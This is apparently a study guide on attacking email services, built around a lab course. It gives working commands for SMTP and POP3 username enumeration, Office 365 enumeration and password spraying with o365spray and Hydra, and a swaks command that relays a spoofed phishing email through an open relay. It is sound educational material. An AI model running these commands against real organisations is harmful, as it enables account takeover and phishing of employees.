# 1. 📬 What Is a Mail Server?

A **mail server** is a server responsible for handling and delivering email over a network, usually the Internet.

A mail server can:

- Receive emails from client devices.
    
- Send emails to other mail servers.
    
- Deliver emails to client devices.
    

A **client** is normally the device where the user reads email, such as:

- Computer
    
- Laptop
    
- Smartphone
    
- Tablet
    

### Basic architecture

```text
                    INTERNET
                       │
          ┌────────────┴────────────┐
          │                         │
          ▼                         ▼
     MAIL SERVER A             MAIL SERVER B
          │                         │
          │                         │
          ▼                         ▼
       User A                    User B
       Client                    Client
```

---

# 2. 📤 SMTP — Sending Email

When we press **Send** in an email application, the email client establishes a connection to an **SMTP server**.

### SMTP

**Simple Mail Transfer Protocol**

SMTP is used to deliver emails:

```text
Client → SMTP Server
```

and:

```text
SMTP Server → SMTP Server
```

### Basic flow

```text
Email Client
     │
     │ SMTP
     ▼
SMTP Server
     │
     │ SMTP
     ▼
Recipient Mail Server
```

---

# 3. 📥 POP3 and IMAP4 — Receiving Email

When an email client downloads messages, it can connect to either:

```text
POP3
IMAP4
```

These protocols allow users to access messages stored in a server mailbox.

---

# 4. POP3 vs IMAP4

This is **very important for exams and enumeration**.

|Feature|POP3|IMAP4|
|---|---|---|
|Full name|Post Office Protocol 3|Internet Message Access Protocol 4|
|Main purpose|Download email|Access/manage email on server|
|Default behavior|Downloads and usually removes messages|Keeps messages on server|
|Multiple devices|Less convenient by default|Very convenient|
|Server copy|Can be configured to keep copies|Normally retained|

### POP3

By default:

```text
Server
  │
  │ Download
  ▼
Client
  │
  ▼
Message removed from server
```

A POP3 client can usually be configured to keep a copy on the server.

### IMAP4

By default:

```text
Server
  │
  ├────────► Phone
  │
  ├────────► Laptop
  │
  └────────► Desktop
```

Messages remain on the server, making multiple-device access easier.

---

# 5. 🗺️ Complete Email Architecture

![Image](https://images.openai.com/static-rsc-4/AqDdEAC_afPSmI9C2wmdTRYSRHQ2HyWvOuBxT00D-x_B76fWj2x7EIzRFAlsMosKmSMPpm3MNJvfCF1hePtEWxazgrT_RotJZSIARhb6IvJX-i-sfz6lAXyqlp-pKmT8T5e6i9XmA27pNQMUDQ8k9HCl07AeHQptxHpreQ8f2u62ohdNJW6S9aPP-W5y3MoC?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/C7fuisfWrazyFpOel3dUXno3MsZoCFR6VuQDhKEA4IrPkMBwR2sylSzGYWwC5GT8s1bir7vgi8KVOfx1gWYL3XPzTPoklq1GFUt5jBA8GmHLaM_CWPCSsLVJ1ELexQ5rV4iRrDwibdhjP01ohZ1adEjN5EB9xxiscXU7ILwubuwBebssFIbUdYuPjgNgEIzG?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/hS3UOe1cCsmSsyuRt3Fp-93qgeE-7fMEKuFU3FWFIDsAQIAGqAWpy66zoqhRoAU8uws6xY3YpfzFMi_RldQrRJaCAoeTiGt9voGPiNcK2q8bMP2rpJYyvHYsLvdpt6RIhSToq4t8MpT9FfBp30lFm554-0OpQAJOI_-x08JoHrju4vM2uELbP5FHYqcAHduL?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/1LvporhNkKtThIsk8G2DlHC7WkBheLxd1_SSMRpgWZz5ErPJSV07XWE5GFd-U_47P7h0frJSXtktb5nqvIRmGXq-Wewmg_n8I9a-jejSgws6vKot5L3c6SN5kWwzu_6c33pjXqpYaK5lM-f3eoBkC8tmm5-dAlCpwLunLLqGqgysZ7dbGDkWfX4GfHw0A3C3?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/drBpnHqgU9KF8YINTPzlYs3ZZ6GvGK0Mcl1JBJniZtYVa0H4O0n2pdL8BEKOR8i5AnO1i6_tsQmJ2zBDCfZygU06f4Rr7S3P03HWrpU4lvtwTAoyHPSGplHz-3c89YyPSeVL4NHUENbHn3bP9OTPEPIgpe9By3rNMCoBUqk-Ot50fT2b5NwCKdl7-eaeNf9B?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/yIFn9xCzniXqrKpYeaP3ycRAIw2LTGCaCdf5X5hrzOMhqlAHaye94KFM4EeHC6zGUoeRxAKD6hKSymktJMNgl0VyX1WQoso4WwTLPB7Zut10N55W8yKkuDcdBo4a2nBNc6zTimi4IVKWJCdjYYkID_3xzIpc4EhoArOXZdFjWm5xzU8mG570sUE0gsdQYXRH?purpose=fullsize)

```text
                         EMAIL SYSTEM
                              │
             ┌────────────────┼────────────────┐
             │                │                │
             ▼                ▼                ▼
           SMTP             POP3             IMAP4
             │                │                │
             ▼                ▼                ▼
          Sending          Downloading      Accessing
           Email             Email            Email
```

---

# 6. 🔎 Email Enumeration

Email servers can be complicated because we may need to enumerate:

- Multiple servers
    
- Multiple ports
    
- Multiple protocols
    
- Cloud email providers
    
- Custom mail servers
    

Modern organizations frequently use cloud email providers such as:

- Microsoft 365
    
- Google Workspace
    

Therefore, the enumeration methodology depends heavily on the underlying service.

---

# 7. ⭐ MX Records

One of the most important things when starting email enumeration is the:

# **MX — Mail eXchanger DNS Record**

An MX record specifies which mail server is responsible for accepting email for a domain.

For example:

```text
example.com
     │
     │ MX
     ▼
mail.example.com
```

---

# 8. 🔄 Multiple MX Records

A domain can have multiple MX records.

This can be used for:

- Load balancing
    
- Redundancy
    
- Failover
    

Example:

```text
example.com
     │
     ├── MX → mail1.example.com
     ├── MX → mail2.example.com
     └── MX → mail3.example.com
```

---

# 9. 🧰 Querying MX Records

Useful tools include:

```text
host
dig
MXToolbox
```

The material demonstrates both `host` and `dig`.

---

# 10. `host` — MX Enumeration

Example:

```bash
host -t MX hackthebox.eu
```

Output:

```text
hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

This indicates that Google handles the domain's email.

Another example:

```bash
host -t MX microsoft.com
```

Output:

```text
microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

---

# 11. `dig` — MX Enumeration

Example:

```bash
dig mx plaintext.do | grep "MX" | grep -v ";"
```

Example result:

```text
plaintext.do. 7076 IN MX 50 mx3.zoho.com.
plaintext.do. 7076 IN MX 10 mx.zoho.com.
plaintext.do. 7076 IN MX 20 mx2.zoho.com.
```

### Another example

```bash
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

Result:

```text
inlanefreight.com. 300 IN MX 10 mail1.inlanefreight.com.
```

---

# 12. 🧠 Interpreting MX Records

From the supplied examples, we can identify different email architectures:

```text
aspmx.l.google.com
        ↓
Google Workspace

microsoft-com.mail.protection.outlook.com
        ↓
Microsoft 365

mx.zoho.com
        ↓
Zoho

mail1.inlanefreight.com
        ↓
Potential custom/company-hosted mail server
```

The source emphasizes that this distinction matters because **enumeration methods differ depending on the email provider**.

---

# 13. ☁️ Cloud Email vs Custom Email

## Cloud Email

Examples:

```text
Google Workspace
Microsoft 365
Zoho
```

These providers commonly use:

- Their own mail-server implementations
    
- Modern authentication
    
- Provider-specific security mechanisms
    

Therefore, they can introduce unique attack surfaces.

## Custom Mail Server

A company may operate its own mail server.

This gives us opportunities to investigate:

- SMTP
    
- POP3
    
- IMAP4
    
- Authentication
    
- Misconfigurations
    
- User enumeration
    

---

# 14. 🔢 Important Email Ports

**Memorize this table.**

|Port|Service|Security|
|--:|---|---|
|**TCP/25**|SMTP|Unencrypted|
|**TCP/110**|POP3|Unencrypted|
|**TCP/143**|IMAP4|Unencrypted|
|**TCP/465**|SMTP|Encrypted|
|**TCP/587**|SMTP|Encrypted / STARTTLS|
|**TCP/993**|IMAP4|Encrypted|
|**TCP/995**|POP3|Encrypted|

### 🔥 Easy memory trick

```text
25   → SMTP
110  → POP3
143  → IMAP

465  → SMTP SSL/TLS
587  → SMTP STARTTLS
993  → IMAP SSL/TLS
995  → POP3 SSL/TLS
```

---

# 15. 🛰️ Nmap Email Enumeration

The source uses:

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

### Breakdown

|Option|Meaning|
|---|---|
|`-Pn`|Skip host discovery|
|`-sV`|Version detection|
|`-sC`|Default NSE scripts|
|`-p...`|Specify email-related ports|

Example result:

```text
25/tcp open smtp Postfix smtpd
```

The SMTP banner also reveals supported commands such as:

```text
PIPELINING
SIZE
VRFY
ETRN
ENHANCEDSTATUSCODES
8BITMIME
DSN
SMTPUTF8
CHUNKING
```

---

# 16. ⚠️ Email Misconfigurations

Email authentication is intended to ensure that only authorized users can send or receive mail.

However, misconfiguration can occur when:

- SMTP permits anonymous behavior.
    
- SMTP allows username enumeration.
    
- POP3 reveals valid users.
    
- Other authentication mechanisms are improperly configured.
    

---

# 17. 👤 SMTP User Enumeration

SMTP provides commands that can potentially reveal whether a username exists:

```text
VRFY
EXPN
RCPT TO
```

If valid usernames are discovered, they can become inputs for further **authorized password auditing**, such as password spraying.

---

# 18. 🔍 VRFY

`VRFY` asks the SMTP server to verify whether a particular user exists.

Example:

```text
VRFY root
```

Possible response:

```text
252 2.0.0 root
```

This indicates that the server accepted the user as valid in the supplied example.

For a nonexistent user:

```text
VRFY new-user
```

Response:

```text
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

---

# 19. 🧪 VRFY Example

Connection:

```bash
telnet 10.10.110.20 25
```

Then:

```text
VRFY root
```

```text
252 2.0.0 root
```

Then:

```text
VRFY www-data
```

```text
252 2.0.0 www-data
```

And:

```text
VRFY new-user
```

```text
550 5.1.1 ... User unknown
```

### Concept

```text
VRFY username
      │
      ▼
SMTP Server
      │
 ┌────┴────┐
 ▼         ▼
Exists   Doesn't exist
```

---

# 20. 📋 EXPN

`EXPN` is similar to `VRFY`.

The difference is important:

> When used against a distribution list, `EXPN` can reveal all users belonging to that list.

This can be more serious than simple `VRFY` enumeration.

For example:

```text
EXPN support-team
```

could reveal:

```text
carol@inlanefreight.htb
elisa@inlanefreight.htb
```

---

# 21. 🎯 Why EXPN Can Be More Dangerous

Imagine:

```text
EXPN all
```

If the server permits it, a distribution list could potentially expose many usernames.

Therefore:

```text
VRFY → Individual user
EXPN → Distribution list / potentially multiple users
```

---

# 22. ✉️ RCPT TO

`RCPT TO` identifies the recipient of an email.

The command can be repeated to specify multiple recipients for a single message.

The important enumeration behavior is that the SMTP server's response can potentially distinguish valid and invalid recipients.

---

# 23. 🧪 RCPT TO Example

First:

```text
MAIL FROM:test@htb.com
```

Then:

```text
RCPT TO:julio
```

Response:

```text
550 5.1.1 julio... User unknown
```

Then:

```text
RCPT TO:kate
```

Response:

```text
550 5.1.1 kate... User unknown
```

But:

```text
RCPT TO:john
```

Response:

```text
250 2.1.5 john... Recipient ok
```

Therefore:

```text
john → likely valid
julio → invalid
kate → invalid
```

---

# 24. 🧠 SMTP Enumeration Summary

|Command|What it can reveal|
|---|---|
|`VRFY`|Whether an individual user exists|
|`EXPN`|Users associated with a distribution list|
|`RCPT TO`|Whether a recipient is accepted/valid|

### ⭐ Remember:

```text
VRFY → Verify
EXPN → Expand
RCPT TO → Recipient
```

---

# 25. 📥 POP3 User Enumeration

POP3 can also potentially reveal usernames depending on the server implementation.

The source demonstrates the:

```text
USER
```

command.

---

# 26. 🧪 POP3 USER Command

Connect to port 110:

```bash
telnet 10.10.110.20 110
```

The server responds:

```text
+OK POP3 Server ready
```

Then:

```text
USER julio
```

Response:

```text
-ERR
```

But:

```text
USER john
```

Response:

```text
+OK
```

Conceptually:

```text
USER username
      │
      ▼
POP3 Server
      │
 ┌────┴─────┐
 ▼          ▼
+OK       -ERR
 │          │
Valid?    Invalid?
```

---

# 27. 🤖 Automating SMTP Enumeration

Manually testing usernames isn't efficient.

The material introduces:

# `smtp-user-enum`

It supports multiple SMTP enumeration modes:

```text
-M VRFY
-M EXPN
-M RCPT
```

and can use a username wordlist with:

```text
-U
```

The target is specified using:

```text
-t
```

and, depending on the mode/server, a domain can be supplied with:

```text
-D
```

---

# 28. 🧰 smtp-user-enum Example

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

The supplied example finds:

```text
jose@inlanefreight.htb
pedro@inlanefreight.htb
kate@inlanefreight.htb
```

### Command breakdown

```text
-M RCPT
```

Use RCPT enumeration.

```text
-U userlist.txt
```

Username wordlist.

```text
-D inlanefreight.htb
```

Target domain.

```text
-t 10.129.203.7
```

Target server.

---

# 29. ☁️ Cloud Email Enumeration

Cloud providers use their own implementations of email services.

This means traditional SMTP/POP3/IMAP techniques aren't always sufficient.

The material uses:

# Microsoft Office 365

as an example.

---

# 30. 🧰 O365spray

`o365spray` is presented as a tool for:

- Office 365 validation
    
- Username enumeration
    
- Password spraying
    

---

# 31. 🔎 Validate Office 365

Example:

```bash
python3 o365spray.py --validate --domain msplaintext.xyz
```

The supplied output confirms:

```text
[VALID] The following domain is using O365: msplaintext.xyz
```

Conceptually:

```text
Domain
  │
  ▼
O365 Validation
  │
  ├── O365
  └── Not O365
```

---

# 32. 👤 O365 Username Enumeration

Once O365 usage has been confirmed, the source demonstrates:

```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

The supplied example discovers:

```text
lewen@msplaintext.xyz
juurena@msplaintext.xyz
```

---

# 33. 🔐 Password Attacks

Once usernames have been identified, the material moves into password attacks.

The source introduces:

# Hydra

Hydra can be used against email services such as:

```text
SMTP
POP3
IMAP4
```

> **Only perform password testing against systems you are explicitly authorized to assess.**

---

# 34. 🧪 Hydra Example

The supplied example uses:

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

The example identifies:

```text
login: john
password: Company01!
```

This demonstrates the concept of **password spraying**: testing a known/common password against multiple candidate accounts rather than trying huge numbers of passwords against one account.

---

# 35. ⚠️ Brute Force vs Password Spraying

This distinction is **very important**.

### Brute Force

```text
ONE USER
   │
   ├── Password1
   ├── Password2
   ├── Password3
   ├── Password4
   └── ...
```

### Password Spraying

```text
ONE PASSWORD
      │
      ├── User A
      ├── User B
      ├── User C
      ├── User D
      └── User E
```

Password spraying is often used to reduce the chance of triggering account lockouts.

---

# 36. ☁️ Cloud Password Spraying

The source explains that cloud services may block traditional tools such as Hydra.

For Microsoft 365, it mentions:

```text
o365spray
MailSniper
```

For Gmail/Okta, it mentions:

```text
CredKing
```

### Important lesson

Tools targeting cloud services can stop working when providers change their authentication mechanisms.

Therefore:

> **Understand what your tools are doing rather than blindly relying on them.**

---

# 37. 🧪 O365 Password Spraying

The supplied example:

```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

The example discovers:

```text
lewen@msplaintext.xyz:March2022!
```

### Important options shown

|Option|Meaning|
|---|---|
|`--spray`|Password spraying mode|
|`-U`|Username list|
|`-p`|Password|
|`--count`|Password attempts per spray|
|`--lockout`|Lockout-related safety setting|
|`--domain`|Target domain|

---

# 38. 🔥 Protocol-Specific Attacks

The material now introduces:

# **SMTP Open Relay**

An **open relay** is an SMTP server that is incorrectly configured to allow unauthenticated email relay.

This means:

```text
Unauthenticated Source
        │
        ▼
   SMTP Server
        │
        ▼
Recipient
```

The server effectively allows mail from arbitrary sources to be relayed through it.

---

# 39. 🚨 Why Is Open Relay Dangerous?

An open relay can allow attackers to make messages appear as though they originated from the organization's mail infrastructure.

Potential abuse includes:

- Phishing
    
- Spoofed sender identities
    
- Spam
    
- Reputation damage
    
- Social engineering
    

The material specifically highlights phishing as an abuse case.

---

# 40. 🖼️ Open Relay Attack Concept

![Image](https://images.openai.com/static-rsc-4/PyCy3OIpPu46HG9eOHDnb3G14FXyARjIZ-gaNHUoT6zThUrG2WSQQNZUtuqKE4LzbbgMbrMwXMDGXSslLhS97rh1Oq-6BhI2JxKxQ-_8zo5cIAldHOfsW3PDbrmHbIX5HfVFE9CynDqcstC_aEstgzXZrfai0PKLQEc4QZNYjBFfo-7vw0JemD2jLs1DiY3a?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Q4DJz8IgpL0YJlBNJWQT7BOXIucWjJaLcz4PT3NNUNSo14M1uwQHXsNR13ocOElhlv6NQuh4Xd6cLBMtSQut_4d4t1T9rfLri8VF900uGLBhJNX1sj1EK3Xj97y9Y0UEIBtIRYV4Z0ETSnmYh25gudR1BNMD6e7xZ-QXlz1SOSfMRfi22b-eyBBVvZ997Wud?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/tGtvJZz4eR4ElVJkAYYJcufKxq4cMcNQdZzIwCqePLbRFMndlS7ZKYUg4eUafmfSAtg4edpQgdf5EerTki0sTMy5xqqhpWRV6R3Kr2It-pw3lhE4kR0XDH4gtE_gSuvJTz9G34tPVBEGKa5OhQPe93TFWGL-3sL6x1NoEdZwcIeZwbBUYqUh3mKvrk8T83CA?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-9ZdWJRmWzwN5V94T7Cvv27qGgWeRMg8F6ssO1f0kIHcTCFpVXgme1_lomPiUWoGFK9b0E6sofxLfp1QcGkPemZwJBIKALBB-txaVjIJWvaA9tT1qWhjhsaFT9P2odcL6aIILscC6tLz904v6IZ4DhnltozfP7SSIYigqiir9WoXry33Ss6BS3e8ukGkSIEd?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/lcWcaVpNB0SGuGM8MIAtxI9mDFV5ESYVf0IjbUCG0nRcw3zvWVe1nNonEnwhxfnhKKjCri-3jtj01eOFFxi-3VaVKI6M8rYpSqAV7B00eDDq_4A3IeBgO5Kb3U_4alYDeOE5rzFfzwlKjd42rl24TZKfOob_jFNerKxEdqbN5kBWXcTe1Ro5aDaBrSyO-XVQ?purpose=fullsize)

```text
              ATTACKER
                  │
                  │ SMTP
                  ▼
          ┌─────────────────┐
          │ Open Relay SMTP │
          │     Server      │
          └────────┬────────┘
                   │
                   │ Relay
                   ▼
               VICTIM
```

The problem is that the SMTP server is accepting and relaying the message without requiring appropriate authentication/authorization.

---

# 41. 🔎 Detecting Open Relay

The source demonstrates Nmap's:

```text
smtp-open-relay
```

script.

Example:

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

The example returns:

```text
smtp-open-relay: Server is an open relay (14/16 tests)
```

---

# 42. ✉️ Testing the Relay With Swaks

The source uses:

# `swaks`

Swaks is a command-line SMTP testing tool.

The supplied example sends an email through the SMTP server:

```bash
swaks --from notifications@inlanefreight.com \
--to employees@inlanefreight.com \
--header 'Subject: Company Notification' \
--body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' \
--server 10.10.11.213
```

**Use this kind of test only within an authorized engagement and with an approved test recipient.**

---

# 43. 🧠 SMTP Conversation

The example demonstrates the basic SMTP interaction:

```text
EHLO
   ↓
MAIL FROM
   ↓
RCPT TO
   ↓
DATA
   ↓
Email Headers
   ↓
Email Body
   ↓
.
   ↓
QUIT
```

Specifically:

```text
MAIL FROM:<notifications@inlanefreight.com>
RCPT TO:<employees@inlanefreight.com>
DATA
```

followed by the email content.

---

# 44. 🧠 Complete Email Attack Methodology

Here's the workflow you should memorize:

```text
                    EMAIL SERVICE
                         │
                         ▼
                  DNS MX Enumeration
                         │
                         ▼
                  Identify Provider
                         │
             ┌───────────┴───────────┐
             │                       │
             ▼                       ▼
       Cloud Provider           Custom Server
             │                       │
             ▼                       ▼
      Provider-specific          Port Scan
       Enumeration                   │
             │              ┌────────┼────────┐
             │              ▼        ▼        ▼
             │            SMTP     POP3     IMAP
             │              │        │        │
             │              ▼        ▼        │
             │            VRFY     USER       │
             │            EXPN                │
             │            RCPT                │
             │              │                  │
             └──────────────┴──────────────────┘
                            │
                            ▼
                    Valid Usernames
                            │
                            ▼
                   Authorized Password
                     Security Testing
                            │
                            ▼
                       Mail Access
```

---

# 45. 🔥 Important Enumeration Chain

### Step 1 — Find MX

```bash
host -t MX example.com
```

or:

```bash
dig mx example.com
```

### Step 2 — Identify Mail Server

Example:

```text
mail.example.com
```

### Step 3 — Resolve Its IP

```bash
host -t A mail.example.com
```

### Step 4 — Enumerate Email Ports

```bash
nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <IP>
```

### Step 5 — Identify Authentication Weaknesses

Look for:

```text
VRFY
EXPN
RCPT TO
POP3 USER
```

### Step 6 — Automate Enumeration

```text
smtp-user-enum
```

### Step 7 — Cloud?

Check whether it uses:

```text
Microsoft 365
Google Workspace
Zoho
```

### Step 8 — Provider-Specific Enumeration

For the supplied O365 example:

```text
o365spray
```

---

# 46. 🧰 Email Pentesting Cheat Sheet

|Tool|Purpose|
|---|---|
|`host`|Query MX/A records|
|`dig`|DNS/MX enumeration|
|`nmap`|Service/version enumeration|
|`telnet`|Manually interact with SMTP/POP3|
|`smtp-user-enum`|Automate SMTP username enumeration|
|`o365spray`|O365 validation/enumeration/spraying|
|`Hydra`|Authorized password testing against supported email services|
|`MailSniper`|Microsoft 365-related security testing|
|`CredKing`|Gmail/Okta credential-testing tool mentioned in source|
|`swaks`|SMTP testing and mail generation|

---

# 47. 📌 Ports — Must Memorize

```text
SMTP
25   → SMTP
465  → SMTP encrypted
587  → SMTP + STARTTLS

POP3
110  → POP3
995  → POP3 encrypted

IMAP4
143  → IMAP4
993  → IMAP4 encrypted
```

### ⭐ Memory pattern

```text
25 / 465 / 587 → SMTP
110 / 995      → POP3
143 / 993      → IMAP4
```

---

# 48. 📌 SMTP Commands — Must Memorize

```text
VRFY
EXPN
RCPT TO
MAIL FROM
DATA
EHLO
```

Especially for enumeration:

```text
VRFY  → Verify user
EXPN  → Expand distribution list
RCPT  → Test recipient
```

---

# 49. 📝 Viva / Interview Questions

### Q1. What is SMTP?

**Simple Mail Transfer Protocol**, used for delivering email from clients to servers and between mail servers.

### Q2. What are POP3 and IMAP4 used for?

They are used by email clients to access/download messages from mail servers.

### Q3. Difference between POP3 and IMAP4?

POP3 normally downloads and removes messages from the server, while IMAP4 normally keeps messages on the server.

### Q4. What is an MX record?

An MX DNS record identifies the mail server responsible for accepting email for a domain.

### Q5. Which command can query MX records?

```bash
host -t MX example.com
```

or:

```bash
dig mx example.com
```

### Q6. What is TCP/25?

SMTP.

### Q7. What is TCP/110?

POP3.

### Q8. What is TCP/143?

IMAP4.

### Q9. What is TCP/587?

SMTP with STARTTLS.

### Q10. What is TCP/993?

Encrypted IMAP4.

### Q11. What is TCP/995?

Encrypted POP3.

### Q12. What is SMTP user enumeration?

Discovering valid usernames by observing responses to SMTP commands such as `VRFY`, `EXPN`, or `RCPT TO`.

### Q13. What does VRFY do?

It asks the SMTP server to verify a username.

### Q14. What does EXPN do?

It can expand a distribution list and potentially reveal its members.

### Q15. What does RCPT TO do?

It identifies the recipient of an email and can sometimes be abused to determine whether a recipient is valid.

### Q16. Can POP3 reveal usernames?

Depending on implementation, yes. The `USER` command may return different responses for valid and invalid users.

### Q17. What is `smtp-user-enum`?

A tool that automates SMTP username enumeration using `VRFY`, `EXPN`, or `RCPT`.

### Q18. What is an open relay?

An SMTP server incorrectly configured to relay unauthenticated email.

### Q19. Why is an open relay dangerous?

It can be abused to send spam/phishing and spoof sender identities through the relay.

### Q20. Which Nmap script checks for SMTP open relay?

```bash
smtp-open-relay
```

---

# 50. ⚡ Final One-Minute Revision

```text
                         EMAIL
                           │
                           ▼
                      MX RECORD
                           │
                           ▼
                   Identify Mail Server
                           │
                           ▼
                      Nmap Scan
                           │
          ┌────────────────┼─────────────────┐
          ▼                ▼                 ▼
         SMTP             POP3              IMAP
          │                │                 │
       TCP/25           TCP/110           TCP/143
       TCP/465          TCP/995           TCP/993
       TCP/587
          │
          ▼
   USER ENUMERATION
          │
    ┌─────┼─────┐
    ▼     ▼     ▼
   VRFY  EXPN  RCPT
          │
          ▼
    Valid Usernames
          │
          ▼
   Authorized Credential
       Testing
          │
          ▼
      Mail Access

CLOUD EMAIL
     │
     ▼
O365 / Google / Zoho
     │
     ▼
Provider-Specific
Enumeration

SMTP
 │
 ▼
OPEN RELAY
 │
 ▼
Unauthenticated Relay
 │
 ▼
Potential Phishing / Spoofing
```

## 🏆 Absolute must-remember points

> **MX → Find the mail server**

> **25/465/587 → SMTP**

> **110/995 → POP3**

> **143/993 → IMAP4**

> **VRFY → Verify users**

> **EXPN → Expand lists**

> **RCPT TO → Recipient enumeration**

> **POP3 USER → Possible username enumeration**

> **smtp-user-enum → Automate SMTP enumeration**

> **O365spray → O365-specific enumeration/spraying**

> **Open Relay → Unauthenticated SMTP relay**

> **smtp-open-relay → Nmap detection script**

> **swaks → SMTP testing/mail generation**

And the overall mindset:

```text
MX
 ↓
Mail Server
 ↓
Ports + Version
 ↓
Authentication
 ↓
User Enumeration
 ↓
Provider Identification
 ↓
Configuration Weaknesses
 ↓
Authorized Credential Testing
 ↓
Protocol-Specific Attacks
```

